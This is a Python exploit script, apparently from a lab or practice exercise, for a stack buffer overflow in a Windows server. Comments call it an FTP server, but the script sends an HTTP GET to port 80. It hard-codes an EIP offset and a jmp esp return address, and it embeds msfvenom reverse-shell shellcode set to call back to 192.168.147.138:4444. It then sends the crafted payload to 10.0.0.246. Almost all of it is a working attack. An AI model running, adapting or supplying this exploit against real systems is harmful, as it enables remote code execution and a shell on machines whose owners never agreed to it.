import struct
import socket

#windows FTP server IP and PORT
addr = ("10.0.0.246",80)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#used for metasploit pattern_create.rb script
pattern_create_length = 5000

#offset obtained by metasploit patterl_offset.rb script
eipoverwrite = 1788
espoverwrite = 1792

#from allchars.py script
badcharacters = """\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f
		\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
		\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f
		\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f
		\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f
		\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
		\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f
		\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
		\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f
		\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
		\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf
		\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
		\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf
		\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf
		\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef
		\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"""

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.147.138 LPORT=4444 -f python -b '\x00\x0a\x0d' -a x86 --platform Windows -v shellcode -n 30
shellcode =  b""
shellcode += b"\x43\xfc\x92\x41\x40\x98\x92\xf5\xd6\x99\xfc"
shellcode += b"\xfc\x40\x9f\xfc\x91\x90\x91\x98\x91\x48\x4a"
shellcode += b"\xf5\x92\x41\x37\xf8\x42\x49\x9f\xb8\x6e\xe1"
shellcode += b"\xf8\xbe\xdd\xc6\xd9\x74\x24\xf4\x5f\x31\xc9"
shellcode += b"\xb1\x52\x83\xc7\x04\x31\x47\x0e\x03\x29\xef"
shellcode += b"\x1a\x4b\x49\x07\x58\xb4\xb1\xd8\x3d\x3c\x54"
shellcode += b"\xe9\x7d\x5a\x1d\x5a\x4e\x28\x73\x57\x25\x7c"
shellcode += b"\x67\xec\x4b\xa9\x88\x45\xe1\x8f\xa7\x56\x5a"
shellcode += b"\xf3\xa6\xd4\xa1\x20\x08\xe4\x69\x35\x49\x21"
shellcode += b"\x97\xb4\x1b\xfa\xd3\x6b\x8b\x8f\xae\xb7\x20"
shellcode += b"\xc3\x3f\xb0\xd5\x94\x3e\x91\x48\xae\x18\x31"
shellcode += b"\x6b\x63\x11\x78\x73\x60\x1c\x32\x08\x52\xea"
shellcode += b"\xc5\xd8\xaa\x13\x69\x25\x03\xe6\x73\x62\xa4"
shellcode += b"\x19\x06\x9a\xd6\xa4\x11\x59\xa4\x72\x97\x79"
shellcode += b"\x0e\xf0\x0f\xa5\xae\xd5\xd6\x2e\xbc\x92\x9d"
shellcode += b"\x68\xa1\x25\x71\x03\xdd\xae\x74\xc3\x57\xf4"
shellcode += b"\x52\xc7\x3c\xae\xfb\x5e\x99\x01\x03\x80\x42"
shellcode += b"\xfd\xa1\xcb\x6f\xea\xdb\x96\xe7\xdf\xd1\x28"
shellcode += b"\xf8\x77\x61\x5b\xca\xd8\xd9\xf3\x66\x90\xc7"
shellcode += b"\x04\x88\x8b\xb0\x9a\x77\x34\xc1\xb3\xb3\x60"
shellcode += b"\x91\xab\x12\x09\x7a\x2b\x9a\xdc\x2d\x7b\x34"
shellcode += b"\x8f\x8d\x2b\xf4\x7f\x66\x21\xfb\xa0\x96\x4a"
shellcode += b"\xd1\xc8\x3d\xb1\xb2\x36\x69\x2a\xc8\xdf\x68"
shellcode += b"\x4c\xdc\x43\xe4\xaa\xb4\x6b\xa0\x65\x21\x15"
shellcode += b"\xe9\xfd\xd0\xda\x27\x78\xd2\x51\xc4\x7d\x9d"
shellcode += b"\x91\xa1\x6d\x4a\x52\xfc\xcf\xdd\x6d\x2a\x67"
shellcode += b"\x81\xfc\xb1\x77\xcc\x1c\x6e\x20\x99\xd3\x67"
shellcode += b"\xa4\x37\x4d\xde\xda\xc5\x0b\x19\x5e\x12\xe8"
shellcode += b"\xa4\x5f\xd7\x54\x83\x4f\x21\x54\x8f\x3b\xfd"
shellcode += b"\x03\x59\x95\xbb\xfd\x2b\x4f\x12\x51\xe2\x07"
shellcode += b"\xe3\x99\x35\x51\xec\xf7\xc3\xbd\x5d\xae\x95"
shellcode += b"\xc2\x52\x26\x12\xbb\x8e\xd6\xdd\x16\x0b\xe6"
shellcode += b"\x97\x3a\x3a\x6f\x7e\xaf\x7e\xf2\x81\x1a\xbc"
shellcode += b"\x0b\x02\xae\x3d\xe8\x1a\xdb\x38\xb4\x9c\x30"
shellcode += b"\x31\xa5\x48\x36\xe6\xc6\x58"

beep_shellcode = """\x55\x89\xE5\x83\xEC\x18\xC7\x45\xFC
			\x10\xC9\xEA\x77
			\xC7\x44\x24\x04
			\xE8\x03
			\x00\x00\xC7\x04\x24
			\xE8\x03
			\x00\x00\x8B\x45\xFC\xFF\xD0\xC9\xC3"""

payload = "\x90"*eipoverwrite
payload += "\xf6\x80\xc1\x75" #75C180F6 jmp esp
payload += "\x90"*25
payload += shellcode
payload += "\x90"*pattern_create_length
payload = "GET" + payload +"HTTP/1.1\r\n\r\n"

s.connect(addr)
s.send(payload)
s.close()
